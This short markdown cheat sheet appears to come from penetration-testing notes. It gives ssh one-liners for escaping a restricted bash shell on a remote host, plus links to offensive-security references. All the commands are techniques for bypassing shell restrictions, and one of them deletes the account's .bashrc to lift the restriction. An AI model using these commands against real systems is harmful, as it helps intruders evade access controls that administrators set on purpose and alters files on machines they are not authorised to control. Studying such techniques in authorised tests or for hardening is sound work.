# bypass bash restrictions

## ssh (most common)

```bash
ssh user@IP -t "bash --noprofile"
ssh -t user@IP bash --norc --noprofile
ssh -t user@IP /bin/sh
ssh -t user@IP "bash --norc --noprofile -c '/bin/rm .bashrc'"

```

## References

* [Hacktricks.xyz/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-unix/useful-linux-commands/bypass-bash-restrictions)
* [hacknos.com/rbash-escape-rbash-restricted-shell-escape](https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape)
* [fireshellsecurity.team/restricted-linux-shell-escaping-techniques](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques)


